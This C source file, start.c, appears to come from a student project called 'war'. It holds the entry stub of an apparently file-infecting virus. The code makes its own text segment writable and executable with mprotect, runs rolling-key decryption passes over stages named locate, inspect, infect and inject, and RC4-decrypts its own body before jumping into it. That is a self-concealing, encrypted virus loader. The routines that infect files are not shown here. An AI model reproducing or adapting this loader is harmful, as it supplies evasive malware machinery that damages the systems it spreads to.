/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*  start.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 19:16:30 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/03 19:39:06 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

int		main(void)
{
	t_data	data = {0};

	void	*sstart = start;
	size_t	align = (unsigned long)sstart % 0x1000;
	if (mprotect(sstart - align, ((void*)end_of_data - (void*)start) + 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
	{
		perror("mprotect");
		return (-1);
	}

	/* // cypher_end */
	/* update_two(&data.key, (char*)release, (size_t)cypher_end - (size_t)release); */
	/* revert_two(&data.key, (char*)cypher_end, (size_t)end - (size_t)cypher_end); */
	/* printf("%-15s: size: %ld\tkey: %lx\n", "cypher_end", (size_t)cypher_end - (size_t)release, data.key.two); */


	// release
	update_one(&data.key, (char*)inject, (size_t)release - (size_t)inject);
	revert_one(&data.key, (char*)release, (size_t)cypher_end - (size_t)release);
	printf("%-15s: size: %ld\tkey: %lx\n", "cypher_end", (size_t)cypher_end - (size_t)release, data.key.one);


	// inject
	update_two(&data.key, (char*)infect, (size_t)inject - (size_t)infect);
	revert_two(&data.key, (char*)inject, (size_t)release - (size_t)inject);
	printf("%-15s: size: %ld\tkey: %lx\n", "inject", (size_t)release - (size_t)inject, data.key.two);


	// infect
	update_one(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);
	revert_one(&data.key, (char*)infect, (size_t)inject - (size_t)infect);
	printf("%-15s: size: %ld\tkey: %lx\n", "infect", (size_t)inject - (size_t)infect, data.key.one);


	// inspect
	update_two(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);
	revert_two(&data.key, (char*)inspect, (size_t)infect - (size_t)inspect);
	printf("%-15s: size: %ld\tkey: %lx\n", "inspect", (size_t)infect - (size_t)inspect, data.key.two);


	// locate
	update_one(&data.key, (char*)war, (size_t)locate - (size_t)war);
	revert_one(&data.key, (char*)locate, (size_t)inspect - (size_t)locate);
	printf("%-15s: size: %ld\tkey: %lx\n", "locate", (size_t)inspect - (size_t)locate, data.key.one);


	// war
	update_two(&data.key, (char*)opening, (size_t)war - (size_t)opening);
	revert_two(&data.key, (char*)war, (size_t)locate - (size_t)war);
	printf("%-15s: size: %ld\tkey: %lx\n", "war", (size_t)locate - (size_t)war, data.key.two);


	// opening
	update_one(&data.key, (char*)start, (size_t)opening - (size_t)start);
	revert_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);
	printf("%-15s: size: %ld\tkey: %lx\n", "opening", (size_t)war - (size_t)opening, data.key.one);


	// revert like start() will do
	update_one(&data.key, (char*)start, (size_t)opening - (size_t)start);
	revert_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);


	data.context = true;
	opening(&data);
}

void	start(void)
{
	__asm__ __volatile__ (
		"push	rbp;"
		"push	0x0;"
		"push	rbx;"
		"push	rax;"
		"push	rdi;"
		"push	rsi;"
		"push	rdx;"
		"push	rcx;"
		"push	r8;"
		"push	r9;"
		"push	r10;"
		"push	r11;"
		"push	r12;"
		"push	r13;"
		"push	r14;"
		"push	r15;"
		);

	t_data	data = {0};
	__asm__ __volatile__ (
		"mov	%0, rsp;"
		: "=r"(data.rsp)
		);

#ifdef DEBUG
	char de[] = "start\t \n";
	data.context == true ?	de[7] = 49 : 48;
	_write(1, de, _strlen(de));
#endif

	_memcpy(data.cpr_key, (uint8_t*)_rc4, KEY_SIZE);
	_rc4((uint8_t*)data.cpr_key, KEY_SIZE, (uint8_t*)opening, ((size_t)_rc4 - (size_t)opening));

	data.context = true;
	update_one(&data.key, (char*)start, (size_t)opening - (size_t)start);
	revert_one(&data.key, (char*)opening, (size_t)war - (size_t)opening);
	opening(&data);
}
